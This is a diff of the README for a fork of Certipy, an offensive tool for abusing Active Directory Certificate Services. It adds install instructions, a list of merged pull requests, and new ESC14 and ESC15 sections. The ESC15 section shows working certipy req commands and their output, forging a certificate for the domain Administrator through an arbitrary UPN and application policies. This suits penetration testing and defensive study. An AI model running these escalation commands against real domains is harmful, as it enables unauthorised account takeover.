@@ -1,6 +1,6 @@
-# Certipy
+# certipy-merged
 
-[![Upload Python Package](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml/badge.svg)](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml)
+This repository contains a fork of [ly4k/Certipy](https://github.com/ly4k/Certipy) with many open pull requests merged, made compatible with each other, and tested (to a certain degree).
 
 Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). If you're not familiar with AD CS and the various domain escalation techniques, I highly recommend reading [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_).
 
@@ -26,21 +26,53 @@ Certipy is an offensive tool for enumerating and abusing Active Directory Certif
       - [ESC8](#esc8)
       - [ESC9 & ESC10](#esc9--esc10)
       - [ESC11](#esc11)
+      - [ESC14](#esc14)
+      - [ESC15](#esc15)
   - [Contact](#contact)
   - [Credits](#credits)
 
 ## Installation
 
+### Using `pipx` (Recommended)
+
+If you prefer the convenience of automagically managed virtual environments, use [`pipx`](https://github.com/pypa/pipx):
+
 ```bash
-pip3 install certipy-ad
+pipx install git+https://github.com/zimedev/certipy-merged.git@main
 ```
 
-## Usage
+If you need support for LDAP Channel Binding, you need to inject the patched `ldap3` library into the Python venv:
 
-A lot of the usage and features are demonstrated in the [blog posts](https://research.ifcr.dk/) for the release of Certipy [2.0](https://research.ifcr.dk/34d1c26f0dc6) and [4.0](https://research.ifcr.dk/7237d88061f7).
-
+```bash
+pipx inject --force certipy-ad git+https://github.com/ly4k/ldap3
 ```
-Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+### Using Python `pip` With a Virtual Environment
+
+If you want to manually manage your installation, use Python's `pip` with `venv` to install in a directory of your choosing, such as `/opt`:
+
+```bash
+cd /opt
+git clone https://github.com/zimedev/certipy-merged
+cd certipy-merged
+python3 -m venv .venv
+source .venv/bin/activate
+python3 -m pip install .
+```
+
+### On Arch Linux
+
+If you're on Arch Linux, you can add the [dadevel/archpkgs](https://github.com/dadevel/archpkgs) repository, which defaults to `certipy-merged` and includes LDAP Channel Binding support out of the box.
+To add the `archpkgs` repo, refer to the official [setup instructions](https://github.com/dadevel/archpkgs?tab=readme-ov-file#setup).
+Next, you can install `archpkgs/certipy`:
+
+```bash
+sudo pacman -Sy archpkgs/certipy
+```
+
+```bash
+/opt/archpkgs/bin/certipy                                                     
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 usage: certipy [-v] [-h] {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template} ...
 
@@ -61,12 +93,39 @@ positional arguments:
     shadow              Abuse Shadow Credentials for account takeover
     template            Manage certificate templates
 
-optional arguments:
+options:
   -v, --version         Show Certipy's version number and exit
   -h, --help            Show this help message and exit
 ```
 
-### Find
+## Merge Status
+
+### Missing PRs:
+
+- [ ] [#211](https://github.com/ly4k/Certipy/pull/211): fix ESC1 false positive
+- [ ] [#229](https://github.com/ly4k/Certipy/pull/229): add smime extensions support (somehow does not work completely with certipy auth)
+
+### Merged PRs:
+
+- [X] [#255](https://github.com/ly4k/Certipy/pull/255): Adds support for ESC14
+- [X] [#254](https://github.com/ly4k/Certipy/pull/254): Adds check for HTTPS and Channel Binding aka EPA for ESC8
+- [X] [#248](https://github.com/ly4k/Certipy/pull/248): fix subject in generated certificate of shadow credentials
+- [X] [#247](https://github.com/ly4k/Certipy/pull/247): add parse sub command to perform stealthy offline ADCS enumeration
+- [X] [#238](https://github.com/ly4k/Certipy/pull/238): fix: check pKIExpirationPeriod & pKIOverlapPeriod
+- [X] [#231](https://github.com/ly4k/Certipy/pull/231): add ldap simple auth
+- [X] [#228](https://github.com/ly4k/Certipy/pull/228): add ESC15
+- [X] [#226](https://github.com/ly4k/Certipy/pull/226): fix ESC1 false positive
+- [X] [#225](https://github.com/ly4k/Certipy/pull/225): fix to solve SID overwrite errors
+- [X] [#222](https://github.com/ly4k/Certipy/pull/222): fix to allow certificate names with slashes or parentheses
+- [X] [#210](https://github.com/ly4k/Certipy/pull/210): add cross domain authentication
+- [X] [#209](https://github.com/ly4k/Certipy/pull/209): accept tgs other than HOST/target@domain
+- [X] [#203](https://github.com/ly4k/Certipy/pull/203): check web enrollment for https
+- [X] [#201](https://github.com/ly4k/Certipy/pull/201): add dcom support
+- [X] [#200](https://github.com/ly4k/Certipy/pull/200): add possibility to add more than 1 keycredential and correctly list them
+- [X] [#198](https://github.com/ly4k/Certipy/pull/198): add ldap-port option
+- [X] [#196](https://github.com/ly4k/Certipy/pull/196): add ESC13
+- [X] [#193](https://github.com/ly4k/Certipy/pull/193): add whencreated and whenmodified for templates
+- [X] [#183](https://github.com/ly4k/Certipy/pull/183): hidden import (pycryptodomex)
 
 The `find` command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations.
 
@@ -813,6 +872,105 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
+```
+#### ESC14
+
+ESC14 is when a user has write access to the `altSecurityIdentities` attribute of a target account (ESC14 A) or when a weak certificate mapping is configured on a target account (ESC14 B-C-D).
+
+In the case of an ESC14 A, we can enroll on a certificate and create an explicit mapping on the target account by modifying its `altSecurityIdentities` attribute and pointing it to the certificate obtained. This certificate can then be used to authenticate as the target.
+
+In the case of an ESC14 B-C-D, the target is configured with a weak explicit mapping that can be abused by modifying the relevant attributes on a separate victim account to match the explicit mapping of the target. We can then enroll on a certificate as the victim, and use this same certificate to authenticate as the target.
+
+There are a number of conditions on certificate templates or other configuration elements that affect the use of ESC14. See the original [blog post](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9) for more information. 
+
+The `find`command below identifies users and computers   configured with weak explicit mapping.
+
+```bash
+$ certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -esc14
+```
+
+### ESC15
+
+ESC15 is when a certificate template has most of the primary conditions for ESC1, including:
+- The template permits low-privilege users to enroll.
+- The template permits the user to specify an arbitrary SAN.
+- The template is using Schema Version 1.
+
+However, the template does not have the 'Client Authentication' EKU. Example output of a vulnerable template would look like the following:
+
+```bash
+  6
+    Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : CORP-DC-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : AttestNone
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Schema Version             : 1
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CORP.COM\Domain Users
+                                          CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+                                          CORP.COM\Authenticated Users
+      Object Control Permissions
+        Owner                           : CORP.COM\Enterprise Admins
+        Write Owner Principals          : CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+        Write Dacl Principals           : CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+        Write Property Principals       : CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+    [!] Vulnerabilities
+      ESC15                             : 'CORP.COM\\Domain Users' and 'CORP.COM\\Authenticated Users' can enroll, enrollee supplies subject and schema version is 1
+```
+
+We can supply arbitrary Application Policies by using the `--application-policies` parameter.
+
+```bash
+certipy req -ca CORP-DC-CA -target-ip 192.168.4.178 -u 'user@corp.com' -p 'Password1' -template "WebServer" -upn "Administrator@corp.com" --application-policies 'Client Authentication'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'CORP.COM' at '127.0.0.53'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 32
+[*] Got certificate with UPN 'Administrator@corp.com'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+You can also specify the Application Policy OID directly.
+
+```bash
+certipy req -ca CORP-DC-CA -target-ip 192.168.4.178 -u 'user@corp.com' -p 'Password1' -template "WebServer" -upn "Administrator@corp.com" --application-policies '1.3.6.1.5.5.7.3.2'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'CORP.COM' at '127.0.0.53'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 33
+[*] Got certificate with UPN 'Administrator@corp.com'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
 ```
 
 ## Contact
